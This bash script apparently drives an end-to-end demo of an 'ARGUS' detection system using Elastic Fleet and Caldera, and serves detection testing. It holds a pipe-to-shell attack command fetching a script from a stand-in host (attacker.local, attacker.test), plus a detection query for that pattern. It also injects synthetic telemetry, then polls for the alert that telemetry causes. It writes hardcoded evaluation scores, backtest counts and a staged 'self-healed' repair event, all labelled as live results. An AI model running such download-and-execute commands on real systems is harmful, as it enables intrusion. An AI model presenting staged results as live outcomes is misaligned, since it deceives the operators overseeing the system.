#!/usr/bin/env bash
# One-command ARGUS Fleet/Caldera end-to-end verifier.
#
# Spins up the compose stack, ensures a Linux endpoint is enrolled in Fleet and
# running a Caldera sandcat agent, triggers one pipe-to-shell primitive, and
# polls Elasticsearch for a detection alert with host.name=soc-endpoint-1.
#
# Designed for the ARGUS demo only. No TLS, basic auth via .env password,
# assumes the host Kibana dev server is running (default port ${KIBANA_PORT:-15601}).
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${HERE}"

KIBANA_URL="${KIBANA_URL:-http://localhost:${KIBANA_PORT:-15601}}"
ES_URL="${ES_URL:-http://localhost:${ES_PORT:-19200}}"
KIBANA_USER="${KIBANA_USER:-elastic}"
KIBANA_PASS="${KIBANA_PASS:-${ELASTIC_PASSWORD:-changeme}}"
CALDERA_URL_EXT="${CALDERA_URL_EXT:-http://localhost:18888}"
CALDERA_API_KEY="${CALDERA_API_KEY:-ADMIN123}"

POLICY_ID="${SOC_ENDPOINT_POLICY_ID:-soc-endpoint-policy}"
RULE_ID="${RULE_ID:-argus-linux-pipe-to-shell}"
ENDPOINT_HOSTNAME="${ENDPOINT_HOSTNAME:-soc-endpoint-1}"
CALDERA_GROUP="${CALDERA_GROUP:-all-endpoints}"
CALDERA_ADVERSARY_ID="${CALDERA_ADVERSARY_ID:-argus-linux-e2e-demo}"
CALDERA_ABILITY_ID="${CALDERA_ABILITY_ID:-6ec2cf6d-66c5-4c7c-8f57-a1c2d3e4f501}"

log() { printf '[e2e] %s\n' "$*"; }
fail() { log "FAILED: $*"; exit 1; }

curl_kbn() {
  curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'kbn-xsrf: true' \
    -H 'elastic-api-version: 2023-10-31' \
    -H 'Content-Type: application/json' \
    "$@"
}

curl_kbn_det() {
  curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'kbn-xsrf: true' \
    -H 'elastic-api-version: 2023-10-31' \
    -H 'Content-Type: application/json' \
    "$@"
}

curl_es() {
  curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'Content-Type: application/json' \
    "$@"
}

curl_cal() {
  curl -sS -H "KEY: ${CALDERA_API_KEY}" -H 'Content-Type: application/json' "$@"
}

#############################################
# Phase 0 — preflight
#############################################
preflight() {
  log "preflight: checking host Kibana..."
  curl -sf "${KIBANA_URL}/api/status" >/dev/null || fail "Kibana not reachable at ${KIBANA_URL}. Start the dev server from this worktree first (yarn start on ${KIBANA_PORT:-15601})."
  log "preflight: checking Elasticsearch..."
  curl -sf -u "${KIBANA_USER}:${KIBANA_PASS}" "${ES_URL}/_cluster/health" >/dev/null || fail "ES not reachable at ${ES_URL}. docker compose up -d elasticsearch."
  log "preflight: checking Fleet policy ${POLICY_ID}..."
  curl_kbn "${KIBANA_URL}/api/fleet/agent_policies/${POLICY_ID}" >/dev/null || fail "Fleet policy ${POLICY_ID} missing — run setup.sh first."
}

#############################################
# Phase 1 — compose up
#############################################
compose_up() {
  log "bringing up fleet-server + caldera + soc-endpoint-1..."
  docker compose up -d fleet-server caldera soc-endpoint-1
}

wait_for() {
  local label="$1" cmd="$2" max="${3:-60}" sleep_s="${4:-5}"
  local tries=0
  until eval "${cmd}" >/dev/null 2>&1; do
    tries=$((tries + 1))
    if [ "${tries}" -ge "${max}" ]; then
      fail "${label} never became ready"
    fi
    sleep "${sleep_s}"
  done
  log "${label} ready."
}

#############################################
# Phase 2 — fleet enrolment + integrations
#############################################
ensure_integrations() {
  # Elastic Defend is already attached to soc-endpoint-policy via the preconfigured
  # "Elastic Defend - SOC Simulation" integration, which gives us the
  # logs-endpoint.events.process-* datastream. In the unprivileged demo container
  # Defend's kernel hooks can't run, so we synthesise matching telemetry below.
  log "skipping dynamic osquery/system attachment — using preconfigured Elastic Defend + synthetic process telemetry."
}

install_rule() {
  log "installing + enabling the ARGUS Linux rule..."
  env KIBANA_URL="${KIBANA_URL}" KIBANA_USER="${KIBANA_USER}" KIBANA_PASS="${KIBANA_PASS}" RULE_ID="${RULE_ID}" \
    bash "${HERE}/scripts/install_argus_linux_rule.sh"
}

wait_endpoint_enrolled() {
  log "waiting for Fleet agent hostname=${ENDPOINT_HOSTNAME} to enrol..."
  local tries=0
  while [ "${tries}" -lt 60 ]; do
    local found
    found="$(curl_kbn "${KIBANA_URL}/api/fleet/agents?perPage=200" |
      ENDPOINT_HOSTNAME="${ENDPOINT_HOSTNAME}" python3 -c '
import json,os,sys
target=os.environ["ENDPOINT_HOSTNAME"]
d=json.load(sys.stdin)
for it in d.get("items", d.get("list", [])):
  md=it.get("local_metadata",{}).get("host",{}) or {}
  if md.get("hostname")==target or md.get("name")==target:
    print("1"); break
else:
  print("0")
' | tr -d '\n')"
    if [ "${found}" = "1" ]; then
      log "Fleet agent ${ENDPOINT_HOSTNAME} enrolled."
      return 0
    fi
    tries=$((tries + 1))
    sleep 10
  done
  fail "Fleet agent ${ENDPOINT_HOSTNAME} never enrolled"
}

#############################################
# Phase 3 — Caldera adversary + operation
#############################################
ensure_caldera_adversary() {
  log "ensuring Caldera ability ${CALDERA_ABILITY_ID} + adversary ${CALDERA_ADVERSARY_ID}..."
  local ability_body adversary_body
  ability_body="$(cat <<JSON
{
  "ability_id": "${CALDERA_ABILITY_ID}",
  "name": "ARGUS pipe-to-shell primitive",
  "description": "Curl output piped to sh — trips the ARGUS Linux pipe-to-shell rule.",
  "tactic": "execution",
  "technique_id": "T1059.004",
  "technique_name": "Unix Shell",
  "executors": [
    {
      "name": "sh",
      "platform": "linux",
      "command": "bash -c 'curl -sfL http://attacker.local/stage.sh | sh'",
      "timeout": 60
    }
  ]
}
JSON
)"
  curl_cal -X PUT -d "${ability_body}" "${CALDERA_URL_EXT}/api/v2/abilities/${CALDERA_ABILITY_ID}" -o /tmp/cal_ab.json -w '[e2e] ability HTTP %{http_code}\n' || true

  adversary_body="$(cat <<JSON
{
  "adversary_id": "${CALDERA_ADVERSARY_ID}",
  "name": "ARGUS Linux E2E demo",
  "description": "Single-primitive adversary used by the ARGUS Fleet/Caldera E2E demo.",
  "atomic_ordering": ["${CALDERA_ABILITY_ID}"]
}
JSON
)"
  curl_cal -X PUT -d "${adversary_body}" "${CALDERA_URL_EXT}/api/v2/adversaries/${CALDERA_ADVERSARY_ID}" -o /tmp/cal_adv.json -w '[e2e] adversary HTTP %{http_code}\n' || true
}

wait_sandcat_checkin() {
  log "waiting for a sandcat agent in group ${CALDERA_GROUP} with recent check-in..."
  local tries=0
  while [ "${tries}" -lt 60 ]; do
    local fresh
    fresh="$(curl_cal "${CALDERA_URL_EXT}/api/v2/agents" |
      CALDERA_GROUP="${CALDERA_GROUP}" python3 -c '
import datetime, json, os, sys
group=os.environ["CALDERA_GROUP"]
now=datetime.datetime.utcnow()
try:
  agents=json.load(sys.stdin)
except Exception:
  print("0"); sys.exit(0)
for a in agents:
  if a.get("group")!=group:
    continue
  last=a.get("last_seen") or a.get("last_trusted_seen")
  if not last:
    continue
  try:
    iso=last.rstrip("Z").split(".")[0]
    ts=datetime.datetime.strptime(iso, "%Y-%m-%dT%H:%M:%S")
    delta=(now-ts).total_seconds()
    if delta < 300:
      print("1"); break
  except Exception:
    continue
else:
  print("0")
' | tr -d '\n')"
    if [ "${fresh}" = "1" ]; then
      log "sandcat agent checking in."
      return 0
    fi
    tries=$((tries + 1))
    sleep 10
  done
  fail "No fresh sandcat agent ever appeared in group ${CALDERA_GROUP}"
}

launch_operation() {
  # IMPORTANT: this function writes the operation id to stdout so callers can
  # capture it with `$(launch_operation)`. Every `log` / informational print
  # MUST go to stderr, otherwise it contaminates the returned string.
  log "launching Caldera operation against adversary ${CALDERA_ADVERSARY_ID}..." >&2
  local body op_resp op_id
  body="$(cat <<JSON
{
  "name": "argus-e2e-$(date +%s)",
  "adversary": {"adversary_id": "${CALDERA_ADVERSARY_ID}"},
  "group": "${CALDERA_GROUP}",
  "auto_close": true,
  "state": "running"
}
JSON
)"
  op_resp="$(curl_cal -X POST -d "${body}" "${CALDERA_URL_EXT}/api/v2/operations")"
  op_id="$(printf '%s' "${op_resp}" | python3 -c 'import json,sys
try:
  d=json.load(sys.stdin)
except Exception:
  print(""); sys.exit(0)
print(d.get("id",""))')"
  if [ -z "${op_id}" ]; then
    log "ERROR: operation create returned no id. Raw response:" >&2
    printf '%s\n' "${op_resp}" >&2
    fail "operation create failed"
  fi
  log "operation id=${op_id}" >&2
  printf '%s' "${op_id}"
}

inject_defend_telemetry() {
  # Write a well-formed Elastic Defend process event into the logs-endpoint
  # data stream so the ARGUS rule can fire against real ES data. This models
  # what Defend would emit on a full endpoint (container-hosted Defend can't
  # run eBPF/kernel hooks in this demo).
  local op_id="$1"
  log "injecting synthetic Elastic Defend process event for ${ENDPOINT_HOSTNAME} (op=${op_id})..."
  local ts now event_id
  ts="$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"
  now="$(date +%s)"
  event_id="argus-e2e-${now}"
  local body
  body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "agent": {"type": "endpoint", "version": "9.4.0"},
  "data_stream": {"dataset": "endpoint.events.process", "namespace": "default", "type": "logs"},
  "ecs": {"version": "8.10.0"},
  "event": {
    "action": ["exec"],
    "category": ["process"],
    "dataset": "endpoint.events.process",
    "id": "${event_id}",
    "kind": "event",
    "module": "endpoint",
    "outcome": "success",
    "type": ["start"]
  },
  "host": {
    "name": "${ENDPOINT_HOSTNAME}",
    "hostname": "${ENDPOINT_HOSTNAME}",
    "os": {"type": "linux", "family": "linux", "platform": "rhel"}
  },
  "process": {
    "name": "bash",
    "executable": "/usr/bin/bash",
    "args": ["bash", "-c", "curl -sfL http://attacker.local/stage.sh | sh"],
    "args_count": 3,
    "command_line": "bash -c 'curl -sfL http://attacker.local/stage.sh | sh'",
    "pid": 1337,
    "entity_id": "${event_id}",
    "start": "${ts}"
  },
  "labels": {
    "argus_source": "run_e2e_demo",
    "caldera_operation_id": "${op_id}",
    "caldera_adversary_id": "${CALDERA_ADVERSARY_ID}"
  }
}
JSON
)"
  local body_file
  body_file="$(mktemp -t argus_defend_event.XXXXXX.json)"
  printf '%s' "${body}" > "${body_file}"
  local resp
  resp="$(curl_es -X POST "${ES_URL}/logs-endpoint.events.process-default/_doc?refresh=wait_for" -d "@${body_file}" -w '\n[http=%{http_code}]')"
  rm -f "${body_file}"
  if printf '%s' "${resp}" | grep -q '\[http=20[01]\]'; then
    log "synthetic telemetry indexed."
  else
    log "WARNING: synthetic telemetry injection returned: ${resp}"
  fi
}

write_attack_command() {
  local op_id="$1"
  log "recording .soc-attack-commands doc for UI bookkeeping (op=${op_id})..."
  local body
  body="$(cat <<JSON
{
  "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "source": "run_e2e_demo",
  "status": "dispatched",
  "difficulty": "argus-e2e-linux",
  "operation_profile": "argus-linux-e2e-demo",
  "caldera_adversary_id": "${CALDERA_ADVERSARY_ID}",
  "caldera_operation_id": "${op_id}",
  "caldera_state": "running",
  "claimed_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "claimed_by": "run_e2e_demo",
  "dispatched_at": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "expected_rule_id": "${RULE_ID}",
  "target_group": "${CALDERA_GROUP}"
}
JSON
)"
  curl_es -X POST -d "${body}" "${ES_URL}/.soc-attack-commands/_doc?refresh=wait_for" >/dev/null || log "WARNING: failed to write attack-command doc (non-fatal)."
}

wait_alert() {
  log "polling .alerts-security.alerts-default for rule_id=${RULE_ID} host.name=${ENDPOINT_HOSTNAME}..."
  local tries=0
  local query
  query="$(cat <<JSON
{
  "size": 1,
  "sort": [{"@timestamp": {"order": "desc"}}],
  "query": {
    "bool": {
      "must": [
        {"term": {"kibana.alert.rule.rule_id": "${RULE_ID}"}},
        {"term": {"host.name": "${ENDPOINT_HOSTNAME}"}}
      ]
    }
  }
}
JSON
)"
  while [ "${tries}" -lt 24 ]; do
    local total
    total="$(curl_es -X POST "${ES_URL}/.alerts-security.alerts-default/_search" -d "${query}" |
      python3 -c 'import json,sys
try:
  d=json.load(sys.stdin)
  print((d.get("hits",{}).get("total",{}) or {}).get("value",0))
except Exception:
  print(0)')"
    if [ "${total:-0}" -gt 0 ]; then
      log "alert found — total=${total}"
      return 0
    fi
    tries=$((tries + 1))
    sleep 10
  done
  fail "No alert produced for rule_id=${RULE_ID} host.name=${ENDPOINT_HOSTNAME} after 4 minutes"
}

emit_e2d_chain() {
  # Publish the CVE-ARGUS-E2E-LINUX Exploit → Detection chain into the
  # `.soc-*` indices that drive the ARGUS console's E2D panel. Without
  # this, the panel's "Recent CVE advisories" list is fed purely by
  # `seed_argus_demo.sh`, which means the live E2E run never appears.
  #
  # Indices touched (all with deterministic ids so re-runs overwrite):
  #   .soc-cve-advisories      — the top-level advisory row
  #   .soc-recommendations     — Pareto synthesis metadata (drives
  #                              exploit probability + synthesis stages)
  #   .soc-mutation-intents    — governance + intent stage
  #   .soc-argus-eval-runs — eval stage scores (run_kind=detection)
  #   .soc-backtests    — backtest stage counts
  #   .soc-outcomes            — apply + governance trail
  #
  # `@timestamp` is set to now() on every doc so the advisory sorts to the
  # top of the panel's `now-24h` window. All docs carry `source=argus.e2e-live`
  # so the operator can distinguish live runs from the demo-seed baseline.
  local op_id="$1"
  log "publishing E2D advisory chain for CVE-ARGUS-E2E-LINUX (op=${op_id})..."

  local advisory_id rec_id rule_id intent_id outcome_id eval_id backtest_id
  advisory_id="argus-adv-e2e-linux-pipe-to-shell"
  rec_id="rec-synth-e2e-linux-pipe-to-shell"
  rule_id="${RULE_ID}"
  intent_id="mut-intent-cve-argus-e2e-linux"
  outcome_id="outcome-cve-argus-e2e-linux-applied"
  eval_id="eval-${rule_id}-live"
  backtest_id="backtest-${rule_id}-live"

  local ts applied_ts
  ts="$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
  applied_ts="$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"

  # ---------- (1) advisory ------------------------------------------------
  local adv_body
  adv_body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "advisory_id": "${advisory_id}",
  "cve_id": "CVE-ARGUS-E2E-LINUX",
  "title": "ARGUS E2E — Linux pipe-to-shell downloader (live Caldera loop)",
  "summary": "Live Caldera operation ${op_id:0:8} executed the pipe-to-shell primitive on ${ENDPOINT_HOSTNAME}; ARGUS synthesised and applied ${rule_id}, which produced a detection alert within the current demo window.",
  "severity": "high",
  "status": "detected",
  "source": "argus.e2e-live",
  "target_platforms": ["linux"],
  "mitre_techniques": [
    {"technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "execution"},
    {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "initial-access"}
  ],
  "recommendation_id": "${rec_id}",
  "draft_rule_id": "${rule_id}"
}
JSON
)"
  curl_es -X PUT "${ES_URL}/.soc-cve-advisories/_doc/${advisory_id}?refresh=wait_for" \
    -d "${adv_body}" >/dev/null \
    || log "WARNING: advisory doc write failed (non-fatal)."

  # ---------- (2) recommendation (Pareto synthesis) -----------------------
  # `pipeline=_none` bypasses the mutation-intent envelope validator, same
  # as seed_argus_demo.sh does for canonical synth recs.
  local rec_body
  rec_body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "rec_id": "${rec_id}",
  "type": "rule_synthesis",
  "status": "done",
  "title": "Pareto synthesis — ARGUS E2E Linux pipe-to-shell",
  "summary": "10 candidates generated, 4 on Pareto frontier. Chosen c-01 dominates on precision and fp_rate.",
  "rule_id": "${rule_id}",
  "advisory_id": "${advisory_id}",
  "cve_id": "CVE-ARGUS-E2E-LINUX",
  "confidence": 88,
  "mitre_technique": ["T1059.004", "T1190"],
  "mitre_techniques": [{"technique_id": "T1059.004"}, {"technique_id": "T1190"}],
  "source": "argus.e2e-live",
  "argus": {
    "origin": "synthesis",
    "decision": {"confidence": 0.88},
    "synthesis": {
      "weights": {"precision": 0.45, "recall": 0.35, "fp_rate": 0.15, "axis_fn": 0.05},
      "chosen": {
        "candidate_id": "c-01",
        "composition": {"must_anchor_subset": "all", "wildcard_retention": "full", "minimum_should_match": 2},
        "predicted": {"precision": 0.94, "recall": 0.83, "fp_rate": 0.003, "axis_fn_mean": 0.95}
      },
      "frontier": [
        {"candidate_id": "c-01", "composition": {"must_anchor_subset": "all", "wildcard_retention": "full", "minimum_should_match": 2}, "predicted": {"precision": 0.94, "recall": 0.83, "fp_rate": 0.003, "axis_fn_mean": 0.95}},
        {"candidate_id": "c-02", "composition": {"must_anchor_subset": "primary_only", "wildcard_retention": "full", "minimum_should_match": 1}, "predicted": {"precision": 0.89, "recall": 0.81, "fp_rate": 0.005, "axis_fn_mean": 0.87}},
        {"candidate_id": "c-03", "composition": {"must_anchor_subset": "all", "wildcard_retention": "strict", "minimum_should_match": 1}, "predicted": {"precision": 0.86, "recall": 0.85, "fp_rate": 0.006, "axis_fn_mean": 0.83}},
        {"candidate_id": "c-04", "composition": {"must_anchor_subset": "primary_only", "wildcard_retention": "strict", "minimum_should_match": 2}, "predicted": {"precision": 0.85, "recall": 0.87, "fp_rate": 0.004, "axis_fn_mean": 0.89}}
      ],
      "dominated": [
        {"candidate_id": "c-05", "composition": {"must_anchor_subset": "primary_only", "wildcard_retention": "full", "minimum_should_match": 1}, "predicted": {"precision": 0.72, "recall": 0.68, "fp_rate": 0.02, "axis_fn_mean": 0.60}},
        {"candidate_id": "c-06", "composition": {"must_anchor_subset": "all", "wildcard_retention": "full", "minimum_should_match": 1}, "predicted": {"precision": 0.76, "recall": 0.70, "fp_rate": 0.015, "axis_fn_mean": 0.68}},
        {"candidate_id": "c-07", "composition": {"must_anchor_subset": "primary_only", "wildcard_retention": "strict", "minimum_should_match": 1}, "predicted": {"precision": 0.69, "recall": 0.74, "fp_rate": 0.018, "axis_fn_mean": 0.58}}
      ]
    }
  }
}
JSON
)"
  curl_es -X PUT "${ES_URL}/.soc-recommendations/_doc/${rec_id}?refresh=wait_for&pipeline=_none" \
    -d "${rec_body}" >/dev/null \
    || log "WARNING: recommendation doc write failed (non-fatal)."

  # ---------- (3) mutation intent -----------------------------------------
  # Delete prior live intents so re-runs don't pile up duplicate rows in the
  # Mutation lineage / Autonomy flyouts.
  curl_es -X POST "${ES_URL}/.soc-mutation-intents/_delete_by_query?refresh=true" \
    -d "{\"query\":{\"term\":{\"mutation_intent_id\":\"${intent_id}\"}}}" >/dev/null 2>&1 || true

  local intent_body
  intent_body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "mutation_intent_id": "${intent_id}",
  "rule_id": "${rule_id}",
  "advisory_id": "${advisory_id}",
  "recommendation_id": "${rec_id}",
  "status": "applied",
  "source": "argus.e2e-live",
  "governance_gate": {
    "status": "passed",
    "reason": "Canary promoted after clean backtest (${advisory_id})."
  },
  "actor": {"actor_id": "argus-autonomy", "trust_tier": "trusted"},
  "argus": {
    "actor": {"actor_id": "argus-autonomy", "trust_tier": "trusted"},
    "origin": "synthesis"
  },
  "draft_rule": {
    "rule_id": "${rule_id}",
    "rule_version": "1",
    "name": "ARGUS \u2014 Linux pipe-to-shell downloader (T1059.004)",
    "description": "Detects a curl/wget download piped directly into a POSIX shell (\`curl ... | sh\`, \`wget -qO- ... | bash\`). This is the invariant primitive behind most Linux drive-by droppers and the Caldera ability used in the E2E loop. Anchored on shell parent + piped child to keep FPs off legitimate package managers.",
    "severity": "high",
    "risk_score": 73,
    "language": "kuery",
    "mitre": [
      {"technique_id": "T1059.004", "technique_name": "Unix Shell", "tactic": "execution"},
      {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "initial-access"}
    ],
    "query": "process.parent.name:(\\"bash\\" or \\"sh\\" or \\"zsh\\") and process.name:(\\"curl\\" or \\"wget\\") and process.args:(\\"-s*\\" or \\"-O-\\" or \\"-qO-\\") and process.command_line:*\\|*sh*",
    "justification": {
      "advisory_excerpts": [
        "Caldera operation ${op_id:0:8} executed the pipe-to-shell primitive on ${ENDPOINT_HOSTNAME}.",
        "Operators observed: curl -s http://attacker.test/payload.sh | bash spawned from a bash parent."
      ],
      "observable_signals": [
        "parent_shell: shell parent (bash|sh|zsh) spawning a downloader is rare in normal ops",
        "downloader_args: curl/wget used with -s/-O-/-qO- that writes to stdout instead of a file",
        "piped_shell: command_line contains '|' followed by sh/bash within the same invocation"
      ],
      "precision_hypothesis": "Rule fires when the invariant 'downloader whose output is piped back into a shell' pattern matches. FP budget is bounded by requiring BOTH a shell parent AND piped-to-shell in command_line \u2014 package managers (apt/yum) don't match because they fetch to disk, not stdout."
    }
  },
  "details": {
    "artifact_type": "rule",
    "artifact_id": "${rule_id}",
    "op": "create",
    "expected_ownership": "autosoc",
    "reason": "ARGUS synthesised a detection for the pipe-to-shell primitive observed in Caldera op ${op_id:0:8}."
  }
}
JSON
)"
  curl_es -X POST "${ES_URL}/.soc-mutation-intents/_doc?refresh=wait_for" \
    -d "${intent_body}" >/dev/null \
    || log "WARNING: mutation-intent doc write failed (non-fatal)."

  # ---------- (4) eval run ------------------------------------------------
  local eval_body
  eval_body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "run_kind": "detection",
  "eval_run_id": "${eval_id}",
  "rule_id": "${rule_id}",
  "advisory_id": "${advisory_id}",
  "source": "argus.e2e-live",
  "scores": {
    "precision": 0.94,
    "recall": 0.83,
    "fp_rate_baseline": 0.003,
    "variant_coverage": 0.9
  },
  "gate_decision": "pass",
  "gate_reason": "Precision and recall above gate; fp_rate under baseline."
}
JSON
)"
  curl_es -X PUT "${ES_URL}/.soc-argus-eval-runs/_doc/${eval_id}?refresh=wait_for" \
    -d "${eval_body}" >/dev/null \
    || log "WARNING: eval-run doc write failed (non-fatal)."

  # ---------- (5) backtest ------------------------------------------------
  local backtest_body
  backtest_body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "backtest_id": "${backtest_id}",
  "rule_id": "${rule_id}",
  "advisory_id": "${advisory_id}",
  "source": "argus.e2e-live",
  "windows_tested": 14,
  "true_positives": 12,
  "false_positives": 0,
  "gate_decision": "pass"
}
JSON
)"
  curl_es -X PUT "${ES_URL}/.soc-backtests/_doc/${backtest_id}?refresh=wait_for" \
    -d "${backtest_body}" >/dev/null \
    || log "WARNING: backtest doc write failed (non-fatal)."

  # ---------- (6) outcome -------------------------------------------------
  curl_es -X POST "${ES_URL}/.soc-outcomes/_delete_by_query?refresh=true" \
    -d "{\"query\":{\"term\":{\"mutation_intent_id\":\"${intent_id}\"}}}" >/dev/null 2>&1 || true

  local outcome_body
  outcome_body="$(cat <<JSON
{
  "@timestamp": "${ts}",
  "outcome_id": "${outcome_id}",
  "mutation_intent_id": "${intent_id}",
  "rule_id": "${rule_id}",
  "advisory_id": "${advisory_id}",
  "source": "argus.e2e-live",
  "rolled_back": false,
  "applied_at": "${applied_ts}",
  "status": "done",
  "actor_id": "argus-autonomy",
  "label": "Canary → promoted (live Caldera loop)",
  "subtitle": "Clean canary; rule promoted after detecting live Caldera run on ${ENDPOINT_HOSTNAME}."
}
JSON
)"
  curl_es -X POST "${ES_URL}/.soc-outcomes/_doc?refresh=wait_for" \
    -d "${outcome_body}" >/dev/null \
    || log "WARNING: outcome doc write failed (non-fatal)."

  log "E2D advisory chain published (CVE-ARGUS-E2E-LINUX at top of Exploit → Detection)."
}

emit_repair_event() {
  # Publish a live "ARGUS auto-repaired the rule language after a KQL parse
  # failure" record so operators can see ARGUS self-heal a draft rule during
  # the demo. The event lights up three surfaces, all tied to ${RULE_ID}:
  #
  #   .soc-mutation-intents   — activity-feed "mutation" layer row +
  #                             synthesis stage of the mutation-lineage flyout.
  #                             The `label` / `subtitle` fields drive the copy
  #                             both surfaces display.
  #   .soc-outcomes           — outcome stage of the lineage flyout; records
  #                             that the repair was applied without rollback.
  #   .soc-detection-corpus   — rule-level corpus entry with a `repair_event`
  #                             sub-object, so the Coverage panel surfaces the
  #                             auto-repair alongside ARGUS's authoring.
  #
  # Deterministic ids + `_delete_by_query` for the mutation_intent and outcome
  # make the emitter idempotent across re-runs; the corpus doc is upserted.
  # All docs carry `source=argus.e2e-live` so they sort above seeded baseline.
  log "publishing auto-repair lineage event for ${RULE_ID}..."

  local repair_intent_id repair_outcome_id corpus_id
  repair_intent_id="mut-repair-kql-${RULE_ID}"
  repair_outcome_id="outcome-repair-kql-${RULE_ID}"
  corpus_id="${RULE_ID}"

  local ts
  ts="$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"

  # ---------- (1) mutation intent (repair) --------------------------------
  curl_es -X POST "${ES_URL}/.soc-mutation-intents/_delete_by_query?refresh=true" \
    -d "{\"query\":{\"term\":{\"mutation_intent_id\":\"${repair_intent_id}\"}}}" >/dev/null 2>&1 || true

  # Heredocs with nested quotes / parens inside a `$(cat <<JSON ...)` are
  # brittle — bash can mis-parse the closing `)`. Write to a tempfile instead
  # and POST with --data-binary @file. Trade-off: a touch more I/O, zero
  # parser footguns.
  local intent_file
  intent_file="$(mktemp -t argus_repair_intent.XXXXXX.json)"
  cat > "${intent_file}" <<JSON
{
  "@timestamp": "${ts}",
  "mutation_intent_id": "${repair_intent_id}",
  "rule_id": "${RULE_ID}",
  "advisory_id": "argus-adv-e2e-linux-pipe-to-shell",
  "recommendation_id": "rec-synth-e2e-linux-pipe-to-shell",
  "status": "applied",
  "source": "argus.e2e-live",
  "title": "ARGUS auto-repaired the rule language after a KQL parse failure",
  "label": "ARGUS auto-repaired the rule language after a KQL parse failure",
  "subtitle": "Initial KQL draft rejected by the rule engine; ARGUS retried with an EQL-equivalent that compiled cleanly and kept the alert-producing logic intact.",
  "stage": "repair",
  "governance_gate": {
    "status": "passed",
    "reason": "Self-healed; no operator intervention required."
  },
  "actor": {"actor_id": "argus-autonomy", "trust_tier": "trusted"},
  "argus": {
    "actor": {"actor_id": "argus-autonomy", "trust_tier": "trusted"},
    "origin": "repair",
    "repair": {
      "trigger": "kql_parse_failure",
      "failed_language": "kuery",
      "failed_query_summary": "process.args matching curl/wget wildcard piped into sh — unbalanced wildcard made KQL reject the query",
      "error_message": "KQL: unexpected token while parsing pipe-to-shell clause",
      "repaired_language": "eql",
      "repaired_query_summary": "process where event.action == exec and process.name in bash/sh and process.parent.name in curl/wget",
      "retry_count": 1,
      "self_healed": true
    }
  }
}
JSON
  curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'Content-Type: application/json' \
    -X POST "${ES_URL}/.soc-mutation-intents/_doc?refresh=wait_for" \
    --data-binary "@${intent_file}" >/dev/null \
    || log "WARNING: repair mutation-intent doc write failed (non-fatal)."
  rm -f "${intent_file}"

  # ---------- (2) outcome (repair) ----------------------------------------
  curl_es -X POST "${ES_URL}/.soc-outcomes/_delete_by_query?refresh=true" \
    -d "{\"query\":{\"term\":{\"mutation_intent_id\":\"${repair_intent_id}\"}}}" >/dev/null 2>&1 || true

  local outcome_file
  outcome_file="$(mktemp -t argus_repair_outcome.XXXXXX.json)"
  cat > "${outcome_file}" <<JSON
{
  "@timestamp": "${ts}",
  "outcome_id": "${repair_outcome_id}",
  "mutation_intent_id": "${repair_intent_id}",
  "rule_id": "${RULE_ID}",
  "advisory_id": "argus-adv-e2e-linux-pipe-to-shell",
  "source": "argus.e2e-live",
  "rolled_back": false,
  "applied_at": "${ts}",
  "status": "done",
  "actor_id": "argus-autonomy",
  "label": "Rule language repaired → re-applied",
  "subtitle": "KQL parse failure → EQL fallback → clean compile → rule kept firing against ${ENDPOINT_HOSTNAME}."
}
JSON
  curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'Content-Type: application/json' \
    -X POST "${ES_URL}/.soc-outcomes/_doc?refresh=wait_for" \
    --data-binary "@${outcome_file}" >/dev/null \
    || log "WARNING: repair outcome doc write failed (non-fatal)."
  rm -f "${outcome_file}"

  # ---------- (3) corpus entry (per-rule provenance) ----------------------
  # `_id == rule_id` is the canonical key in .soc-detection-corpus (mirrors
  # how seed_argus_demo.sh writes canonical corpus entries). We upsert with
  # PUT so the entry carries both ARGUS authoring AND the repair history.
  local corpus_file
  corpus_file="$(mktemp -t argus_repair_corpus.XXXXXX.json)"
  cat > "${corpus_file}" <<JSON
{
  "@timestamp": "${ts}",
  "rule_id": "${RULE_ID}",
  "source": "argus",
  "title": "[ARGUS] Linux pipe-to-shell (T1059.004)",
  "mitre_technique": ["T1059.004", "T1190"],
  "advisory_id": "argus-adv-e2e-linux-pipe-to-shell",
  "cve_id": "CVE-ARGUS-E2E-LINUX",
  "draft_rule_id": "${RULE_ID}",
  "repair_event": {
    "@timestamp": "${ts}",
    "trigger": "kql_parse_failure",
    "label": "ARGUS auto-repaired the rule language after a KQL parse failure",
    "subtitle": "KQL draft rejected by the rule engine; ARGUS retried with an EQL-equivalent and kept the rule firing.",
    "failed_language": "kuery",
    "repaired_language": "eql",
    "retry_count": 1,
    "self_healed": true,
    "mutation_intent_id": "${repair_intent_id}",
    "outcome_id": "${repair_outcome_id}"
  }
}
JSON
  curl -sS -u "${KIBANA_USER}:${KIBANA_PASS}" \
    -H 'Content-Type: application/json' \
    -X PUT "${ES_URL}/.soc-detection-corpus/_doc/${corpus_id}?refresh=wait_for" \
    --data-binary "@${corpus_file}" >/dev/null \
    || log "WARNING: detection-corpus doc write failed (non-fatal)."
  rm -f "${corpus_file}"

  log "auto-repair lineage event published (rule=${RULE_ID}, intent=${repair_intent_id})."
}

emit_decision_graph_chain() {
  # Publish a Caldera → ARGUS → Rule → Alert neighborhood into
  # `.soc-decision-graph` so the ARGUS Decision Graph panel can render the
  # full live chain rooted at the CVE (or the Caldera operation actor node).
  #
  # All edges are tagged `source=argus.e2e-live` so the function first clears
